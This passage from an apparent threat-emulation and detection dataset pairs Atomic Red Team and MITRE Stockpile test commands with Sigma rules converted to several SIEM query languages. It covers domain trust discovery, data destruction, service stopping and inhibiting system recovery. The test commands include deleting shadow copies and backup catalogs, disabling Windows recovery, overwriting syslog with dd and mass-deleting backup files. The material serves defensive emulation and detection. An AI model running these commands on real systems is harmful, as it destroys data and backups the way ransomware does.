\"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1223\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\hh.exe AND CommandLine.keyword:*.chm*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\hh.exe AND CommandLine.keyword:*.chm*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'HH.exe execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\hh.exe AND CommandLine.keyword:*.chm*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\hh.exe\" CommandLine=\"*.chm*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\hh.exe\" CommandLine=\"*.chm*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\hh\\\\.exe)(?=.*.*\\\\.chm.*))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1482/T1482.yaml", "command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n", "name": null}, {"source": "atomics/T1482/T1482.yaml", "command": "nltest /domain_trusts\n", "name": null}, {"source": "atomics/T1482/T1482.yaml", "command": "Get-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n", "name": null}, {"source": "data/abilities/discovery/6131397e-7765-424e-a594-3d7fb2d93a6a.yml", "command": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.ad.forest", "json_key": "Forest", "json_type": ["str"]}, {"source": "domain.ad.name", "json_key": "Name", "json_type": ["str"]}]}, "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1\n", "payload": "powerview.ps1"}}}, "name": "Determine the Windows Domain of a computer"}], "command_list": ["dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n", "nltest /domain_trusts\n", "Get-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n", {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.ad.forest", "json_key": "Forest", "json_type": ["str"]}, {"source": "domain.ad.name", "json_key": "Name", "json_type": ["str"]}]}, "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1\n", "payload": "powerview.ps1"}}}], "technique_id": "T1482", "parsed_datasets": [{"Atomic Red Team Test - Domain Trust Discovery": {"display_name": "Domain Trust Discovery", "atomic_tests": [{"description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n", "supported_platforms": ["windows"], "name": "Windows - Discover domain trusts with dsquery", "executor": {"command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n", "name": "command_prompt"}}, {"description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n", "supported_platforms": ["windows"], "name": "Windows - Discover domain trusts with nltest", "executor": {"command": "nltest /domain_trusts\n", "name": "command_prompt"}}, {"description": "Use powershell to enumerate AD information\n", "supported_platforms": ["windows"], "name": "Powershell enumerate domains and forests", "executor": {"elevation_required": false, "command": "Get-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n", "name": "powershell"}}], "attack_technique": "T1482"}}, {"Mitre Stockpile - Determine the Windows Domain of a computer": {"platforms": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.ad.forest", "json_key": "Forest", "json_type": ["str"]}, {"source": "domain.ad.name", "json_key": "Name", "json_type": ["str"]}]}, "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1\n", "payload": "powerview.ps1"}}}, "description": "Determine the Windows Domain of a computer", "tactic": "discovery", "technique": {"attack_id": "T1482", "name": "Domain Trust Discovery"}, "id": "6131397e-7765-424e-a594-3d7fb2d93a6a", "name": "GetDomain"}}], "queries": [{"query": "title: Domain Trust Discovery\nid: 77815820-246c-47b8-9741-e0def3f57308\nstatus: experimental\ndescription: Detects a discovery of domain trusts\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.yaml\nauthor: Jakob Weinzettl, oscd.community\ndate: 2019/10/23\nmodified: 2019/11/08\ntags:\n    - attack.discovery\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n      - Image|endswith: '\\dsquery.exe'\n        CommandLine|contains|all:\n            - '-filter'\n            - 'trustedDomain'\n      - Image|endswith: '\\nltest.exe'\n        CommandLine|contains: 'domain_trusts'\n    condition: selection\nfalsepositives:\n    - Administrators script of some sort\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Domain Trust Discovery\nid: 77815820-246c-47b8-9741-e0def3f57308\nstatus: experimental\ndescription: Detects a discovery of domain trusts\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.yaml\nauthor: Jakob Weinzettl, oscd.community\ndate: 2019/10/23\nmodified: 2019/11/08\ntags:\n    - attack.discovery\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n      - Image|endswith: '\\dsquery.exe'\n        CommandLine|contains|all:\n            - '-filter'\n            - 'trustedDomain'\n      - Image|endswith: '\\nltest.exe'\n        CommandLine|contains: 'domain_trusts'\n    condition: selection\nfalsepositives:\n    - Administrators script of some sort\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\dsquery.exe AND CommandLine.keyword:*\\\\-filter* AND CommandLine.keyword:*trustedDomain*) OR (Image.keyword:*\\\\\\\\nltest.exe AND CommandLine.keyword:*domain_trusts*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Domain-Trust-Discovery <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Domain Trust Discovery\",\\n    \"description\": \"Detects a discovery of domain trusts\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1482\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\dsquery.exe AND CommandLine.keyword:*\\\\\\\\-filter* AND CommandLine.keyword:*trustedDomain*) OR (Image.keyword:*\\\\\\\\\\\\\\\\nltest.exe AND CommandLine.keyword:*domain_trusts*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\dsquery.exe AND CommandLine.keyword:*\\\\\\\\-filter* AND CommandLine.keyword:*trustedDomain*) OR (Image.keyword:*\\\\\\\\\\\\\\\\nltest.exe AND CommandLine.keyword:*domain_trusts*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Domain Trust Discovery\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\dsquery.exe AND CommandLine.keyword:*\\\\-filter* AND CommandLine.keyword:*trustedDomain*) OR (Image.keyword:*\\\\\\\\nltest.exe AND CommandLine.keyword:*domain_trusts*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\dsquery.exe\" CommandLine=\"*-filter*\" CommandLine=\"*trustedDomain*\") OR (Image=\"*\\\\\\\\nltest.exe\" CommandLine=\"*domain_trusts*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((Image=\"*\\\\\\\\dsquery.exe\" CommandLine=\"*-filter*\" CommandLine=\"*trustedDomain*\") OR (Image=\"*\\\\\\\\nltest.exe\" CommandLine=\"*domain_trusts*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*.*\\\\dsquery\\\\.exe)(?=.*.*-filter.*)(?=.*.*trustedDomain.*))|.*(?:.*(?=.*.*\\\\nltest\\\\.exe)(?=.*.*domain_trusts.*))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Domain Trust Discovery\nid: 3bad990e-4848-4a78-9530-b427d854aac0\ndescription: Identifies execution of nltest.exe and dsquery.exe for domain trust discovery. This technique is used by attackers to enumerate Active Directory trusts.\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Tony Lambert), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/03e231a6-74bc-467a-acb1-e5676b0fb55e.html\ntags:\n    - attack.discovery\n    - attack.t1482\ndetection:\n    selection:\n      - Image|endswith: '\\nltest.exe'\n        CommandLine|contains: 'domain_trusts'\n      - Image|endswith: '\\dsquery.exe'\n        CommandLine|contains: 'trustedDomain'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the utilities by legitimate user for legitimate reason\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Domain Trust Discovery\nid: 3bad990e-4848-4a78-9530-b427d854aac0\ndescription: Identifies execution of nltest.exe and dsquery.exe for domain trust discovery. This technique is used by attackers to enumerate Active Directory trusts.\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Tony Lambert), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/03e231a6-74bc-467a-acb1-e5676b0fb55e.html\ntags:\n    - attack.discovery\n    - attack.t1482\ndetection:\n    selection:\n      - Image|endswith: '\\nltest.exe'\n        CommandLine|contains: 'domain_trusts'\n      - Image|endswith: '\\dsquery.exe'\n        CommandLine|contains: 'trustedDomain'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the utilities by legitimate user for legitimate reason\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\nltest.exe AND CommandLine.keyword:*domain_trusts*) OR (Image.keyword:*\\\\\\\\dsquery.exe AND CommandLine.keyword:*trustedDomain*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Domain-Trust-Discovery <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Domain Trust Discovery\",\\n    \"description\": \"Identifies execution of nltest.exe and dsquery.exe for domain trust discovery. This technique is used by attackers to enumerate Active Directory trusts.\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1482\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\nltest.exe AND CommandLine.keyword:*domain_trusts*) OR (Image.keyword:*\\\\\\\\\\\\\\\\dsquery.exe AND CommandLine.keyword:*trustedDomain*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\nltest.exe AND CommandLine.keyword:*domain_trusts*) OR (Image.keyword:*\\\\\\\\\\\\\\\\dsquery.exe AND CommandLine.keyword:*trustedDomain*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Domain Trust Discovery\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\nltest.exe AND CommandLine.keyword:*domain_trusts*) OR (Image.keyword:*\\\\\\\\dsquery.exe AND CommandLine.keyword:*trustedDomain*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\nltest.exe\" CommandLine=\"*domain_trusts*\") OR (Image=\"*\\\\\\\\dsquery.exe\" CommandLine=\"*trustedDomain*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((Image=\"*\\\\\\\\nltest.exe\" CommandLine=\"*domain_trusts*\") OR (Image=\"*\\\\\\\\dsquery.exe\" CommandLine=\"*trustedDomain*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*.*\\\\nltest\\\\.exe)(?=.*.*domain_trusts.*))|.*(?:.*(?=.*.*\\\\dsquery\\\\.exe)(?=.*.*trustedDomain.*))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1485/T1485.yaml", "command": "vssadmin.exe delete shadows /all /quiet\n", "name": null}, {"source": "atomics/T1485/T1485.yaml", "command": "wbadmin.exe delete catalog -quiet\n", "name": null}, {"source": "atomics/T1485/T1485.yaml", "command": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n", "name": null}, {"source": "atomics/T1485/T1485.yaml", "command": "New-Item $env:TEMP\\T1485.txt\nPathToAtomicsFolder\\T1485\\bin\\sdelete.exe -accepteula $env:TEMP\\T1485.txt\n", "name": null}, {"source": "atomics/T1485/T1485.yaml", "command": "dd of=#{file_to_overwrite} if=/dev/zero\n", "name": null}, {"source": "atomics/T1485/T1485.yaml", "command": "dd of=/var/log/syslog if=/dev/zero\n", "name": null}, {"source": "atomics/T1485/T1485.yaml", "command": "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk >nul 2>&1\n", "name": null}], "command_list": ["vssadmin.exe delete shadows /all /quiet\n", "wbadmin.exe delete catalog -quiet\n", "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n", "New-Item $env:TEMP\\T1485.txt\nPathToAtomicsFolder\\T1485\\bin\\sdelete.exe -accepteula $env:TEMP\\T1485.txt\n", "dd of=#{file_to_overwrite} if=/dev/zero\n", "dd of=/var/log/syslog if=/dev/zero\n", "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk >nul 2>&1\n"], "technique_id": "T1485", "parsed_datasets": [{"Atomic Red Team Test - Data Destruction": {"display_name": "Data Destruction", "atomic_tests": [{"description": "Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\n", "supported_platforms": ["windows"], "name": "Windows - Delete Volume Shadow Copies", "executor": {"elevation_required": true, "command": "vssadmin.exe delete shadows /all /quiet\n", "name": "command_prompt"}}, {"description": "Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\n", "supported_platforms": ["windows"], "name": "Windows - Delete Windows Backup Catalog", "executor": {"elevation_required": true, "command": "wbadmin.exe delete catalog -quiet\n", "name": "command_prompt"}}, {"description": "Disables repair by the Windows Recovery Console on boot.\nThis technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\n", "supported_platforms": ["windows"], "name": "Windows - Disable Windows Recovery Console Repair", "executor": {"elevation_required": true, "command": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n", "name": "command_prompt", "cleanup_command": "bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures\nbcdedit.exe /set {default} recoveryenabled yes\n"}}, {"dependencies": [{"description": "Secure delete tool from Sysinternals must exist on disk at specified location (#{sdelete_exe})\n", "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/SDelete.zip\" -OutFile \"$env:TEMP\\SDelete.zip\"\nExpand-Archive $env:TEMP\\SDelete.zip $env:TEMP\\Sdelete -Force\nNew-Item -ItemType Directory (Split-Path \"#{sdelete_exe}\") -Force | Out-Null\nCopy-Item $env:TEMP\\Sdelete\\sdelete.exe \"#{sdelete_exe}\" -Force\n", "prereq_command": "if (Test-Path #{sdelete_exe}) {0} else {1}\n"}], "supported_platforms": ["windows"], "name": "Windows - Overwrite file with Sysinternals SDelete", "executor": {"command": "New-Item $env:TEMP\\T1485.txt\n#{sdelete_exe} -accepteula $env:TEMP\\T1485.txt\n", "name": "powershell"}, "description": "Overwrites and deletes a file using Sysinternals SDelete.\nRequires the download of either Sysinternals Suite or the individual SDelete utility.\n", "input_arguments": {"sdelete_exe": {"default": "PathToAtomicsFolder\\T1485\\bin\\sdelete.exe", "type": "Path", "description": "Path of sdelete executable"}}, "dependency_executor_name": "powershell"}, {"description": "Overwrites and deletes a file using DD.\nTo stop the test, break the command with CTRL/CMD+C.\n", "supported_platforms": ["linux", "macos"], "name": "macOS/Linux - Overwrite file with DD", "input_arguments": {"overwrite_source": {"default": "/dev/zero", "type": "Path", "description": "Path of data source to overwrite with"}, "file_to_overwrite": {"default": "/var/log/syslog", "type": "Path", "description": "Path of file to overwrite and remove"}}, "executor": {"command": "dd of=#{file_to_overwrite} if=#{overwrite_source}\n", "name": "bash"}}, {"description": "Deletes backup files in a manner similar to Ryuk ransomware.\n", "supported_platforms": ["windows"], "name": "Windows - Delete Backup Files", "executor": {"elevation_required": true, "command": "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk >nul 2>&1\n", "name": "command_prompt"}}], "attack_technique": "T1485"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1489/T1489.yaml", "command": "sc.exe stop spooler\n", "name": null}, {"source": "atomics/T1489/T1489.yaml", "command": "net.exe stop spooler\n", "name": null}, {"source": "atomics/T1489/T1489.yaml", "command": "taskkill.exe /f /im spoolsv.exe\n", "name": null}], "command_list": ["sc.exe stop spooler\n", "net.exe stop spooler\n", "taskkill.exe /f /im spoolsv.exe\n"], "technique_id": "T1489", "parsed_datasets": [{"Atomic Red Team Test - Service Stop": {"display_name": "Service Stop", "atomic_tests": [{"description": "Stops a specified service using the sc.exe command.\n", "supported_platforms": ["windows"], "name": "Windows - Stop service using Service Controller", "input_arguments": {"service_name": {"default": "spooler", "type": "String", "description": "Name of a service to stop"}}, "executor": {"elevation_required": true, "command": "sc.exe stop #{service_name}\n", "name": "command_prompt", "cleanup_command": "sc.exe start #{service_name}\n"}}, {"description": "Stops a specified service using the net.exe command.\n", "supported_platforms": ["windows"], "name": "Windows - Stop service using net.exe", "input_arguments": {"service_name": {"default": "spooler", "type": "String", "description": "Name of a service to stop"}}, "executor": {"elevation_required": true, "command": "net.exe stop #{service_name}\n", "name": "command_prompt", "cleanup_command": "net.exe start #{service_name}\n"}}, {"description": "Stops a specified service killng the service's process. \nThis technique was used by WannaCry.\n", "supported_platforms": ["windows"], "name": "Windows - Stop service by killing process", "input_arguments": {"process_name": {"default": "spoolsv.exe", "type": "String", "description": "Name of a process to kill"}}, "executor": {"elevation_required": false, "command": "taskkill.exe /f /im #{process_name}\n", "name": "command_prompt"}}], "attack_technique": "T1489"}}], "queries": [{"query": "title: Stop windows service\nid: eb87818d-db5d-49cc-a987-d5da331fbd90\ndescription: Detects a windows service to be stopped\nstatus: experimental\nauthor: Jakob Weinzettl, oscd.community\ndate: 2019/10/23\nmodified: 2019/11/08\ntags:\n    - attack.impact\n    - attack.t1489\ndetection:\n    selection:\n      - Image|endswith: '\\taskkill.exe'\n      - Image|endswith:\n            - '\\sc.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'stop'\n    condition: selection\nfalsepositives:\n    - Administrator shutting down the service due to upgrade or removal purposes\nlevel: low\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Stop windows service\nid: eb87818d-db5d-49cc-a987-d5da331fbd90\ndescription: Detects a windows service to be stopped\nstatus: experimental\nauthor: Jakob Weinzettl, oscd.community\ndate: 2019/10/23\nmodified: 2019/11/08\ntags:\n    - attack.impact\n    - attack.t1489\ndetection:\n    selection:\n      - Image|endswith: '\\taskkill.exe'\n      - Image|endswith:\n            - '\\sc.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'stop'\n    condition: selection\nfalsepositives:\n    - Administrator shutting down the service due to upgrade or removal purposes\nlevel: low\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\taskkill.exe OR (Image.keyword:(*\\\\\\\\sc.exe OR *\\\\\\\\net.exe OR *\\\\\\\\net1.exe) AND CommandLine.keyword:*stop*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Stop-windows-service <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Stop windows service\",\\n    \"description\": \"Detects a windows service to be stopped\",\\n    \"tags\": [\\n      \"attack.impact\",\\n      \"attack.t1489\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\taskkill.exe OR (Image.keyword:(*\\\\\\\\\\\\\\\\sc.exe OR *\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe) AND CommandLine.keyword:*stop*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\taskkill.exe OR (Image.keyword:(*\\\\\\\\\\\\\\\\sc.exe OR *\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe) AND CommandLine.keyword:*stop*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Stop windows service\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\taskkill.exe OR (Image.keyword:(*\\\\\\\\sc.exe *\\\\\\\\net.exe *\\\\\\\\net1.exe) AND CommandLine.keyword:*stop*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\taskkill.exe\" OR ((Image=\"*\\\\\\\\sc.exe\" OR Image=\"*\\\\\\\\net.exe\" OR Image=\"*\\\\\\\\net1.exe\") CommandLine=\"*stop*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image=\"*\\\\\\\\taskkill.exe\" OR (Image IN [\"*\\\\\\\\sc.exe\", \"*\\\\\\\\net.exe\", \"*\\\\\\\\net1.exe\"] CommandLine=\"*stop*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*.*\\\\taskkill\\\\.exe|.*(?:.*(?=.*(?:.*.*\\\\sc\\\\.exe|.*.*\\\\net\\\\.exe|.*.*\\\\net1\\\\.exe))(?=.*.*stop.*))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1490/T1490.yaml", "command": "vssadmin.exe delete shadows /all /quiet\n", "name": null}, {"source": "atomics/T1490/T1490.yaml", "command": "wmic.exe shadowcopy delete\n", "name": null}, {"source": "atomics/T1490/T1490.yaml", "command": "wbadmin.exe delete catalog -quiet\n", "name": null}, {"source": "atomics/T1490/T1490.yaml", "command": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n", "name": null}, {"source": "atomics/T1490/T1490.yaml", "command": "powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\"\n", "name": null}], "command_list": ["vssadmin.exe delete shadows /all /quiet\n", "wmic.exe shadowcopy delete\n", "wbadmin.exe delete catalog -quiet\n", "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n", "powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\"\n"], "technique_id": "T1490", "parsed_datasets": [{"Atomic Red Team Test - Inhibit System Recovery": {"display_name": "Inhibit System Recovery", "atomic_tests": [{"description": "Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\n", "supported_platforms": ["windows"], "name": "Windows - Delete Volume Shadow Copies", "executor": {"elevation_required": true, "command": "vssadmin.exe delete shadows /all /quiet\n", "name": "command_prompt"}}, {"description": "Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\n", "supported_platforms": ["windows"], "name": "Windows - Delete Volume Shadow Copies via WMI", "executor": {"elevation_required": true, "command": "wmic.exe shadowcopy delete\n", "name": "command_prompt"}}, {"description": "Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\n", "supported_platforms": ["windows"], "name": "Windows - Delete Windows Backup Catalog", "executor": {"elevation_required": true, "command": "wbadmin.exe 